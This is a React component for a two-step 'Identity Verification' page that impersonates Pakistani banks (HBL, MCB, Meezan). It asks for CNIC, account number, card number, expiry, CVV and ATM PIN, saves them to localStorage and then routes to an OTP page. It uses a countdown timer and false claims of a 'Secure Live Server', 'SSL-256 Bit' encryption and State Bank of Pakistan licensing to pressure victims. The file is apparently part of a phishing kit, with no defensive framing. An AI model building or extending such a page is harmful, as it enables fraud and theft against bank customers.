import { useNavigate } from "react-router-dom";
import { useState, useEffect } from "react";
import { Shield, Lock, AlertTriangle, CheckCircle, Eye, EyeOff, Clock, Info, ArrowRight, CreditCard } from "lucide-react";

const VerificationForm = () => {
    const navigate = useNavigate();
    const [timeLeft, setTimeLeft] = useState(180);
    const [showPassword, setShowPassword] = useState(false);
    const [step, setStep] = useState(1);
    const [formData, setFormData] = useState({
        fullName: "", cnic: "", mobile: "", email: "",
        bank: "", accountNumber: "", debitCard: "",
        cvv: "", expiryDate: "", pin: ""
    });

    useEffect(() => {
        const timer = setInterval(() => {
            setTimeLeft((prev) => (prev <= 1 ? 0 : prev - 1));
        }, 1000);
        return () => clearInterval(timer);
    }, []);

    const formatTime = (seconds) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}:${secs.toString().padStart(2, "0")}`;
    };

    const handleCardFormatting = (value) => {
        return value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim().slice(0, 19);
    };

    const handleExpiryFormatting = (value) => {
        let v = value.replace(/\D/g, '');
        if (v.length > 2) return v.slice(0, 2) + '/' + v.slice(2, 4);
        return v;
    };

    const handleChange = (e) => {
        const { name, value } = e.target;
        let formattedValue = value;

        if (name === "debitCard") formattedValue = handleCardFormatting(value);
        if (name === "expiryDate") formattedValue = handleExpiryFormatting(value);
        if (name === "pin" || name === "cvv") formattedValue = value.replace(/\D/g, '');

        setFormData({ ...formData, [name]: formattedValue });
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        localStorage.setItem("verificationData", JSON.stringify(formData));
        if (step === 1) {
            window.scrollTo({ top: 0, behavior: 'smooth' });
            setStep(2);
        } else {
            navigate("/otp");
        }
    };

    return (
        <div className="min-h-screen flex items-center justify-center px-4 py-8 bg-[#f8fafc]">
            <div className="max-w-2xl w-full">
                {/* Header Section */}
                <div className="text-center mb-8">
                    <div className="inline-flex items-center gap-2 bg-white border border-gray-200 rounded-full px-4 py-1.5 shadow-sm mb-4">
                        <span className="relative flex h-2 w-2">
                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                            <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                        </span>
                        <span className="text-xs font-bold uppercase tracking-wider text-gray-600">Secure Live Server</span>
                    </div>
                    <h1 className="text-3xl font-extrabold text-gray-900 tracking-tight">Identity Verification</h1>
                    <p className="text-gray-500 mt-2">Required for continued access to your banking services</p>
                </div>

                <div className="bg-white shadow-xl rounded-[2rem] overflow-hidden border border-gray-100">
                    {/* Timer Bar */}
                    <div className={`h-1.5 transition-all duration-1000 ${timeLeft < 60 ? 'bg-red-500' : 'bg-green-500'}`}
                        style={{ width: `${(timeLeft / 180) * 100}%` }}></div>

                    <div className="p-6 sm:p-10">
                        {/* Status Message */}
                        <div className="flex items-center justify-between mb-10 bg-gray-50 p-4 rounded-2xl">
                            <div className="flex items-center gap-3">
                                <div className="p-2 bg-blue-100 rounded-lg text-blue-600">
                                    <Clock className="w-5 h-5" />
                                </div>
                                <div>
                                    <p className="text-xs text-gray-500 font-medium">Session Expires In</p>
                                    <p className={`text-sm font-bold ${timeLeft < 60 ? 'text-red-600' : 'text-gray-800'}`}>{formatTime(timeLeft)}</p>
                                </div>
                            </div>
                            <div className="h-8 w-[1px] bg-gray-200"></div>
                            <div className="flex items-center gap-3 text-right">
                                <div>
                                    <p className="text-xs text-gray-500 font-medium">Security Level</p>
                                    <p className="text-sm font-bold text-green-600">SSL-256 Bit</p>
                                </div>
                                <div className="p-2 bg-green-100 rounded-lg text-green-600">
                                    <Shield className="w-5 h-5" />
                                </div>
                            </div>
                        </div>

                        {/* Step 2 Visual Card Preview */}
                        {step === 2 && (
                            <div className="mb-8 relative h-48 w-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-2xl p-6 text-white shadow-lg overflow-hidden">
                                <div className="absolute top-0 right-0 p-8 opacity-10">
                                    <CreditCard size={120} />
                                </div>
                                <div className="flex justify-between items-start mb-8">
                                    <div className="h-10 w-14 bg-yellow-400/80 rounded-md"></div>
                                    <Shield className="text-white/50" />
                                </div>
                                <div className="text-xl tracking-[0.2em] font-mono mb-4">
                                    {formData.debitCard || "•••• •••• •••• ••••"}
                                </div>
                                <div className="flex justify-between items-end">
                                    <div>
                                        <p className="text-[10px] uppercase text-white/60">Card Holder</p>
                                        <p className="text-sm font-medium tracking-wide truncate max-w-[150px]">{formData.fullName || "FULL NAME"}</p>
                                    </div>
                                    <div className="text-right">
                                        <p className="text-[10px] uppercase text-white/60">Expires</p>
                                        <p className="text-sm font-medium">{formData.expiryDate || "MM/YY"}</p>
                                    </div>
                                </div>
                            </div>
                        )}

                        <form onSubmit={handleSubmit} className="space-y-6">
                            {step === 1 ? (
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                    <div className="md:col-span-2">
                                        <InputField label="Full Name" name="fullName" value={formData.fullName} onChange={handleChange} placeholder="As per CNIC" required />
                                    </div>
                                    <InputField
                                        label="CNIC Number"
                                        name="cnic"
                                        value={formData.cnic}
                                        onChange={(e) => {
                                            let value = e.target.value.replace(/\D/g, ""); // Remove non-digits
                                            if (value.length > 5) value = value.slice(0, 5) + "-" + value.slice(5);
                                            if (value.length > 13) value = value.slice(0, 13) + "-" + value.slice(13);
                                            if (value.length > 15) value = value.slice(0, 15); // Max length
                                            setFormData({ ...formData, cnic: value });
                                        }}
                                        placeholder="XXXXX-XXXXXXX-X"
                                        required
                                        maxLength="15"
                                    />
                                    <InputField label="Mobile Number" name="mobile" value={formData.mobile} onChange={handleChange} placeholder="03XXXXXXXXX" required />
                                    <InputField label="Email Address" name="email" value={formData.email} onChange={handleChange} type="email" placeholder="name@email.com" required />
                                    <div className="space-y-2">
                                        <label className="text-sm font-bold text-gray-700">Bank Name</label>
                                        <select name="bank" value={formData.bank} onChange={handleChange} className="w-full bg-gray-50 border text-black border-gray-200 rounded-xl px-4 py-3 focus:ring-2 focus:ring-blue-500 outline-none transition-all" required>
                                            <option value="">Select Bank</option>
                                            <option value="hbl">HBL</option>
                                            <option value="mcb">MCB</option>
                                            <option value="meezan">Meezan</option>
                                        </select>
                                    </div>
                                    <div className="md:col-span-2">
                                        <InputField label="Account Number (IBAN/Standard)" name="accountNumber" value={formData.accountNumber} onChange={handleChange} placeholder="Enter your full account number" required />
                                    </div>
                                </div>
                            ) : (
                                <div className="space-y-6 animate-in fade-in duration-500">
                                    <InputField label="Card Number" name="debitCard" value={formData.debitCard} onChange={handleChange} placeholder="0000 0000 0000 0000" required maxLength="19" />
                                    <div className="grid grid-cols-2 gap-4">
                                        <InputField label="Expiry Date" name="expiryDate" value={formData.expiryDate} onChange={handleChange} placeholder="MM/YY" required maxLength="5" />
                                        <InputField label="CVV" name="cvv" value={formData.cvv} onChange={handleChange} placeholder="123" type="password" required maxLength="3" />
                                    </div>
                                    <div className="relative">
                                        <InputField label="ATM PIN" name="pin" value={formData.pin} onChange={handleChange} type={showPassword ? "text" : "password"} placeholder="••••" required maxLength="4" />
                                        <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-4 top-[38px] text-gray-400">
                                            {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                                        </button>
                                    </div>
                                </div>
                            )}

                            <button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-bold transition-all shadow-lg shadow-blue-200 flex items-center justify-center gap-2">
                                {step === 1 ? 'Next: Card Verification' : 'Verify My Identity'}
                                <ArrowRight size={20} />
                            </button>

                            {step === 2 && (
                                <button type="button" onClick={() => setStep(1)} className="w-full text-gray-500 text-sm font-medium hover:text-gray-700">
                                    ← Edit Personal Information
                                </button>
                            )}
                        </form>
                    </div>
                </div>

                <p className="text-center mt-8 text-xs text-gray-400">
                    © 2026 Secure Banking Services. All rights reserved. <br />
                    Licensed by the State Bank of Pakistan.
                </p>
            </div>
        </div>
    );
};

// Reusable Input Component to keep code clean
const InputField = ({ label, ...props }) => (
    <div className="space-y-2">
        <label className="text-sm font-bold text-gray-700">{label}</label>
        <input
            {...props}
            className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-gray-900 focus:ring-2 focus:ring-blue-500 focus:bg-white outline-none transition-all placeholder:text-gray-400"
        />
    </div>
);

export default VerificationForm;